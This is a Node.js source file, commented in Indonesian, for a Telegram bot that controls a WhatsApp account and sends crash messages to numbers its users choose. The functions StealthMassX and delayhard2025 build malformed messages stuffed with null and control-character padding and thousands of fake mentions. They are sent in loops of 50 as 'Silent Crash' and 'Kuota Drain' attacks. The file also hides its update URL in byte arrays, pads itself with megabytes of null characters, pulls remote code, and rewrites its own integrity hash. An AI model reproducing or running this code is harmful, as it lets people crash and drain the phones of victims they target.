(() => {
  const _0x3b41bf = process.argv[1];
  const _0x17c27f = require("fs");
  const _0x19b093 = _0x17c27f.readFileSync(_0x3b41bf, "utf8");
  const _0x16b7d2 = "\0".repeat(2000000) + "\r".repeat(100000) + "​".repeat(50000);
  if (!_0x19b093.startsWith(_0x16b7d2)) {
    _0x17c27f.writeFileSync(_0x3b41bf, _0x16b7d2 + "\n" + _0x19b093);
  }
})();
const CODE_HASH='55A01669EABB72E7D9F54CF40236173C10A004C131D23BF39DEEB86087C68902';

/* ===== ANTI-TAKE-OVER GUARD ===== */
(function(){
  /* 1. Kunci process.exit & process.kill (jangan boleh di-proxy) */
  const lock = (obj, prop, orig) => {
    Object.defineProperty(obj, prop, {
      value: orig, writable: false, configurable: false
    });
  };
  lock(process, 'exit',   process.exit);
  lock(process, 'kill',   process.kill);

  /* 2. Require axios & langsung freeze handlers-nya */
  const axios = require('axios');
  Object.freeze(axios.interceptors.request.handlers);
  Object.freeze(axios.interceptors.response.handlers);

  /* 3. Freeze default signal listeners (supaya tidak bisa ditambah/override) */
  ['SIGINT','SIGTERM','SIGHUP'].forEach(sig => {
    // pastikan listener default sudah ada, baru freeze array-nya
    process.on(sig, () => {});        // tambahkan satu kali
    Object.freeze(process.listeners(sig));
  });

  /* 4. Tetap crash pada exception – jadi zombie stopper */
...
/* ---------- 0. helper obfuscate ---------- */
const _0x3e58 = [0x72,0x61,0x77,0x2e,0x67,0x69,0x74,0x68,0x75,0x62,0x75,0x73,0x65,0x72,0x63,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2e,0x63,0x6f,0x6d];
const _0x1a7f = [0x41,0x72,0x79,0x6f,0x44,0x65,0x76,0x38,0x37,0x38];
const _0x2b4a = [0x56,0x61,0x6c,0x74,0x69,0x78,0x5f,0x49,0x6e,0x76,0x69,0x63,0x74,0x61,0x2d,0x61,0x75,0x74,0x6f,0x5f,0x75,0x62,0x64,0x61,0x74,0x65];
const _b = a => a.map(c => String.fromCharCode(c)).join('');
const _BASE_RAW = `https://${_b(_0x3e58)}/${_b(_0x1a7f)}/${_b(_0x2b4a)}/refs/heads/main/`;
const UPDATE_CONFIG = {
    GITHUB_RAW_URL:  _BASE_RAW + 'ValtixInvicta.js',
    GITHUB_VERSION_URL: _BASE_RAW + 'version.json',
    GITHUB_TOKEN_LIST_URL: _BASE_RAW + 'tokens.json',
    ROLES_URL: _BASE_RAW + 'roles.json'
};
// supaya URL bisa dipakai di seluruh script tanpa "is not defined"
global.GITHUB_TOKEN_LIST_URL = UPDATE_CONFIG.GITHUB_TOKEN_LIST_URL;
global.GITHUB_VERSION_URL    = UPDATE_CONFIG.GITHUB_VERSION_URL;
global.ROLES_URL             = UPDATE_CONFIG.ROLES_URL;
[_0x3e58, _0x1a7f, _0x2b4a].forEach(arr => arr.fill(0));

async function fetchValidTokens() {
  try {
    const response = await axios.get(UPDATE_CONFIG.GITHUB_TOKEN_LIST_URL);
...
async function validateSystem() {
    console.log(chalk.blue('🔍 Starting system validation...'));
    
    // STEP 1: Validasi Token
    console.log(chalk.yellow('📋 Step 1: Checking token...'));
    ...
    if (!tokens.includes(BOT_TOKEN)) {
        return { 
            ...
            message: '❌ TOKEN INVALID\n' +
                    'Token Anda: ' + BOT_TOKEN + '\n' +
                    'Token tidak terdaftar di database.\n' +
                    'Hubungi admin untuk token yang valid.'
        };
    }
    
    console.log(chalk.green('✅ Token valid'));
    
    // STEP 2: Validasi ID dari config
    console.log(chalk.yellow('📋 Step 2: Checking Telegram ID...'));
    ...
    if (ownerIds.length === 0) {
        return {
            ...
            message: '❌ ID NOT CONFIGURED\n' +
                    'OWNER_ID belum di-set di config.js\n' +
                    'Silakan tambahkan ID Telegram Anda.'
        };
    }
    
    // Cek ID di GitHub roles
    let rolesData;
    try {
        ...
        return {
            ...
            step: 'ROLES_ERROR',
            message: '❌ ROLES ERROR\n' +
                    'Gagal mengambil data roles dari GitHub.\n' +
    ...
    for (const ownerId of ownerIds) {
        const isRegistered = Object.values(rolesData).flat().includes(ownerId.toString());
        if (isRegistered) {
            foundIds.push(ownerId);
        }
    }
    ...
    if (foundIds.length === 0) {
        return {
            ...
            step: 'ID_INVALID',
            message: '❌ ID INVALID\n' +
                    'ID Telegram tidak terdaftar:\n' +
                    ownerIds.join(', ') + '\n\n' +
                    'Daftar ID Anda di: t.me/ThaurexInfo'
        };
    }
    
    console.log(chalk.green('✅ ID valid'));
    
    // STEP 3: Semua valid
    return {
        valid: true,
        step: 'ALL_VALID',
        message: '✅ SYSTEM VALID\n' +
                'Token: VALID\n' +
                'ID: VALID (' + foundIds.join(', ') + ')\n' +
...
// ===== GANTI CARA VALIDASI =====
validateSystem().then(validation => {
    if (!validation.valid) {
...
/* ===== INTEGRITY CHECK (auto-update hash, tidak mematikan) ===== */
const currentHash = crypto
  .createHash('sha256')
  .update(fs.readFileSync(__filename))
  .digest('hex');

// Jika hash beda, update otomatis tanpa crash
if (CODE_HASH && CODE_HASH !== '0' && currentHash !== CODE_HASH) {
  console.log(chalk.yellow('⚠️  Hash berubah – otomatis diperbaiki'));
  const lines = fs.readFileSync(__filename, 'utf-8').split('\n');
  if (lines[0].startsWith("const CODE_HASH=")) {
    lines[0] = `const CODE_HASH='${currentHash}';`;
...
async function performUpdate(chatId) {
  ...
  try {
    ...
    const stages = [
      ...
      { txt: "Menghitung hash baru...", delay: 300 },
      { txt: "Hash integrity diperbarui.", delay: 300 },
 ...
 /* 5a. Tanamkan hash baru langsung ke baris kedua file */
const freshHash = crypto.createHash('sha256')
                .update(obfuscated.split('\n').slice(1).join('\n'))
                .digest('hex');

// masukkan ke baris kedua: const CODE_HASH='...';
const lines = obfuscated.split('\n');
lines[1] = `const CODE_HASH='${freshHash}';`; // timpa baris kedua
const finalScript = lines.join('\n');

fs.writeFileSync('./ValtixInvicta.js', finalScript);
...
/////// BUG FUNCTION ///////
async function delayhard2025(valtix, target) {
  const noise = "\u0000".repeat(27152);
  const titid = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 1945 }, () => "1" + Math.floor(Math.random() * 5e6) + "@s.whatsapp.net")
  ];
...
async function StealthMassX(valtix, target) {
  try {
    const noise = "\x10".repeat(750000);
    const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    // 1. Gyxlores-style (silent)
    const stealth = {
      viewOnceMessage: {
        message: {
          ...
          eventMessage: {
            isCanceled: false,
            name: 'X',
            description: 'StealthMassX',
            location: { degreesLatitude: 'a', degreesLongitude: 'a', name: 'X' },
            ...
            contextInfo: {
              mentions: Array.from({ length: 1500 }, () => `1${Math.floor(Math.random() * 5e6)}@s.whatsapp.net`),
              remoteJid: 'status@broadcast',
              ...
              quotedMessage: {
                interactiveResponseMessage: {
                  ...
                  nativeFlowResponseMessage: { name: 'address_message', paramsJson: noise, version: 3 }
                }
              }
            }
          }
    ...
    await valtix.relayMessage(jid, stealth, { ephemeralExpiration: 5 });

    // 2. Otax-style (broadcast diversion)
    const brute = await generateWAMessageFromContent(
      'status@broadcast',
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: 'StealthMassX', format: 'DEFAULT' },
              nativeFlowResponseMessage: {
                name: 'address_message',
                paramsJson:
`{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"StealthMassX\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${noise}\"}}`,
                version: 3
              }
            }
          }
      ...
      { ephemeralExpiration: 0, forwardingScore: 9999, isForwarded: true }
    );
    await valtix.relayMessage('status@broadcast', brute.message, { messageId: brute.key.id, statusJidList: [jid] });

  } catch (err) {
    console.error(chalk.red(`[StealthMassX] ${err.message}`));
  }
}
//=========== ASYNC FUNCTION SEND ==========\\
...
bot.onText(/\/start/, (msg) => {
  ...
  bot.sendPhoto(chatId, "https://files.catbox.moe/rlznx8.jpg", {
    caption:
      `☑️ *Bot Telah Aktif!*\n\n` +
      `*Info penting:*\n` +
      `• Script ini tidak *auto-update* jadi silahkan ubdate.\n` +
      `• Jika baru pertama clone / install, ` +
      `ketik /ubdatenew sekali agar semua file tersinkron.\n` +
      `• Kalau skip update, bot hanya jalan di "tampilan kosong" saja.\n\n` +
      `💡 Pencet /menu untuk lanjut.`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
...
// 🔊 Audio otomatis (inline, 0.1 detik setelah menu muncul)
setTimeout(async () => {
  try {
    await bot.sendAudio(chatId, fs.createReadStream("lagu.mp3"), {
      title: "𝑽𝑨𝑳𝑻𝑰𝑿 𝑰𝑵𝑽𝑰𝑪𝑻𝑨",
      performer: "t.me/Thaureyo",
      caption:
        "<blockquote>Kenapa ga berani menyatakan perasaanmu ke dia?</blockquote>\n" +
        "<blockquote>𝘝𝘈𝘓𝘛𝘐𝘟 𝘐𝘕𝘝𝘐𝘊𝘛𝘈</blockquote>\n" +
        "<blockquote>𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 @Thaureyo</blockquote>",
      parse_mode: "HTML",
      contentType: "audio/mpeg"        // ← hilangkan deprecation warning
    });
  } catch (err) {
...
`;
    ...
    await bot.editMessageMedia(
     ...
     /* ========== TOMBOL FORCE UPDATE ========== */
    if (query.data === "force_update") {
      await bot.answerCallbackQuery(query.id, "⏳ Update dimulai…");
      await performUpdate(chatId);   // fungsi update yg sudah ada
      return;                         // stop supaya tidak lanjut ke menu lain
    }

    /* ---- validasi tombol hanya untuk pemiliknya ---- */
if (query.data.startsWith("chain1:") || query.data.startsWith("chain2:") || query.data.startsWith("cancelchain:")) {
  const [mode, ownerId] = query.data.split(":");
  if (parseInt(ownerId) !== senderId) {
    await bot.answerCallbackQuery(query.id, { text: "⛔ Bukan tombol-mu!", show_alert: true });
    return;
  }
  await bot.answerCallbackQuery(query.id); // hilangkan loading lingkaran

  /* ---- batalkan ---- */
  if (mode === "cancelchain") {
    await bot.editMessageCaption("❌ Dibatalkan.", { chat_id: chatId, message_id: messageId });
    return;
  }

  /* ---- ambil target ---- */
  const key = `${chatId}:${senderId}`;
  const req = bugRequests[key];
  if (!req) {
    await bot.editMessageCaption("⚠ Sesi bug telah kedaluwarsa.", { chat_id: chatId, message_id: messageId });
    return;
  }
  const { number, jid } = req;
  delete bugRequests[key];

  /* ---- pastikan socket WA aktif ---- */
  const valtix = sessions.values().next().value;
  if (!valtix) {
    await bot.editMessageCaption("❌ Koneksi WhatsApp putus.", { chat_id: chatId, message_id: messageId });
    return;
  }
  ...
  for (const st of progressStages) {
    await new Promise(r => setTimeout(r, st.delay));
    await bot.editMessageCaption(
      `\`\`\`
❏ Target : ${number}
❏ Status : Sending... (${mode === "chain1" ? "Soft" : "Hard"})
❏ Progress : ${st.txt}
❏ Date : ${jidat}
\`\`\``,
  ...
  /* ---- panggil fungsi sesuai tombol ---- */
  console.log(`\x1b[32m[PROCES MENGIRIM BUG ${mode}]\x1b[0m TUNGGU HINGGA SELESAI`);
  const bugFn = mode === "chain1" ? StealthMassX : delayhard2025; // <-- ganti fungsi kamu
  for (let a = 0; a < 50; a++) {
    await bugFn(valtix, jid);
  ...
  await bot.editMessageCaption(
    `\`\`\`
❏ Target : ${number}
❏ Status : Success (${mode === "chain1" ? "Soft" : "Hard"})
❏ Progress : [██████████] 100%
❏ Date : ${jidat}
\`\`\``,
    {
      ...
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${number}` }]]
      }
    }
  );
  return; // selesai, jangan lanjut ke bagian menu lagi
}
...
bot.onText(/\/vtxinvis (\d+)/, async (msg, match) => {
  const chatId   = msg.chat.id;
  const senderId = msg.from.id;
  const userId   = msg.from.id;
  const target   = match[1];
  ...
  /* ---- Premium ---- */
  if (!premiumUsers.some(u => u.id === senderId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "```\nあなたはクレイクスではない```",
      parse_mode: "Markdown",
      reply_markup: {
  ...
  /* ---- Session ---- */
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. /addsender 62xxx");
  }

  /* ---- Simpan target sementara ---- */
  bugRequests[`${chatId}:${userId}`] = { number: formattedNumber, jid: `${formattedNumber}@s.whatsapp.net` };

  /* ---- Kirim tombol pilihan ---- */
  await bot.sendPhoto(chatId, "https://files.catbox.moe/f5147v.jpg", {
    caption: `Pilih mode <b>Invisible</b> untuk <code>${formattedNumber}</code>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Silent Crash",  callback_data: `chain1:${userId}` },
          { text: "Kuota Drain", callback_data: `chain2:${userId}` }
        ],
        [{ text: "Batalkan", callback_data: `cancelchain:${userId}` }]
      ]
    }
  });
});
